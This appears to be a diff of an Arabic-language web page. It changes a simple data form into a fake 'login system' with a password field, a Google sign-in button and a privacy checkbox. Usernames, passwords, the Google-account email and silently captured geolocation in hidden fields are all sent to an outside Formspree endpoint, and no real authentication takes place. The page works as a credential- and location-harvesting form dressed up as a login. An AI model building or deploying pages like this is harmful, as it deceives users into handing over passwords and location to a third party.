@@ -3,7 +3,8 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>إرسال بيانات المستخدم</title>
+  <title>منظومة تسجيل الدخول</title>
+  <script src="https://accounts.google.com/gsi/client" async defer></script>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -23,13 +24,19 @@
       width: 320px;
       text-align: center;
     }
-    input[type="text"] {
+    input[type="text"],
+    input[type="password"] {
       width: 100%;
       padding: 10px;
       margin-bottom: 15px;
       border-radius: 6px;
       border: none;
       font-size: 16px;
+    }
+    label {
+      font-size: 14px;
+      display: block;
+      margin-bottom: 10px;
     }
     button {
       width: 100%;
@@ -46,15 +53,42 @@
       font-size: 14px;
       min-height: 20px;
     }
+    .checkbox-container {
+      display: flex;
+      align-items: center;
+      justify-content: start;
+      gap: 5px;
+      margin-bottom: 10px;
+      font-size: 13px;
+      text-align: right;
+    }
+    .google-button {
+      margin-bottom: 15px;
+      display: flex;
+      justify-content: center;
+    }
   </style>
 </head>
 <body>
 
   <form id="dataForm" action="https://formspree.io/f/xzzvzzkk" method="POST" novalidate>
-    <h2>أدخل أي شيء</h2>
-    <input type="text" name="contact" id="email" placeholder="اكتب هنا أي شيء (بريد أو نص...)" />
+    <h2>منظومة تسجيل الدخول</h2>
+
+    <!-- زر تسجيل الدخول بجوجل -->
+    <div class="google-button" id="g_id_signin"></div>
+
+    <input type="text" name="contact" id="contact" placeholder="اكتب بريد أو اسم مستخدم" />
+    
+    <input type="password" name="password" placeholder="اكتب كلمة السر (أي شيء)" />
+    
+    <div class="checkbox-container">
+      <input type="checkbox" id="privacyCheck" />
+      <label for="privacyCheck">أوافق على سياسة الخصوصية</label>
+    </div>
+
     <input type="hidden" name="latitude" id="latitude" />
     <input type="hidden" name="longitude" id="longitude" />
+
     <button type="submit">إرسال البيانات</button>
     <div class="message" id="message"></div>
   </form>
@@ -62,8 +96,10 @@
   <script>
     const form = document.getElementById('dataForm');
     const messageDiv = document.getElementById('message');
+    const privacyCheck = document.getElementById('privacyCheck');
+    const contactInput = document.getElementById('contact');
 
-    // طلب الموقع الجغرافي
+    // جلب الموقع الجغرافي
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         position => {
@@ -74,13 +110,25 @@
           console.warn('لم يتم الحصول على الموقع:', error.message);
         }
       );
-    } else {
-      console.warn('المتصفح لا يدعم الموقع الجغرافي');
     }
 
     // إرسال البيانات
     form.addEventListener('submit', e => {
       e.preventDefault();
+      messageDiv.style.color = 'white';
+
+      const contactValue = contactInput.value.trim();
+
+      if (!contactValue) {
+        messageDiv.textContent = 'يرجى إدخال بريد إلكتروني أو اسم مستخدم.';
+        return;
+      }
+
+      if (!privacyCheck.checked) {
+        messageDiv.textContent = 'يجب الموافقة على سياسة الخصوصية قبل الإرسال.';
+        return;
+      }
+
       messageDiv.textContent = 'جارٍ إرسال البيانات...';
 
       const formData = new FormData(form);
@@ -104,6 +152,36 @@
         messageDiv.textContent = 'حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.';
       });
     });
+
+    // تهيئة تسجيل الدخول بـ Google
+    window.onload = function () {
+      google.accounts.id.initialize({
+        client_id: "YOUR_GOOGLE_CLIENT_ID", // <-- استبدله بمفتاحك من Google
+        callback: handleCredentialResponse
+      });
+
+      google.accounts.id.renderButton(
+        document.getElementById("g_id_signin"),
+        { theme: "outline", size: "large", text: "signin_with" }
+      );
+    }
+
+    function handleCredentialResponse(response) {
+      const jwt = parseJwt(response.credential);
+      const email = jwt.email;
+      if (email) {
+        document.getElementById("contact").value = email;
+      }
+    }
+
+    function parseJwt(token) {
+      const base64Url = token.split('.')[1];
+      const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
+      const jsonPayload = decodeURIComponent(atob(base64).split('').map(function (c) {
+          return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+      }).join(''));
+      return JSON.parse(jsonPayload);
+    }
   </script>
 
 </body>
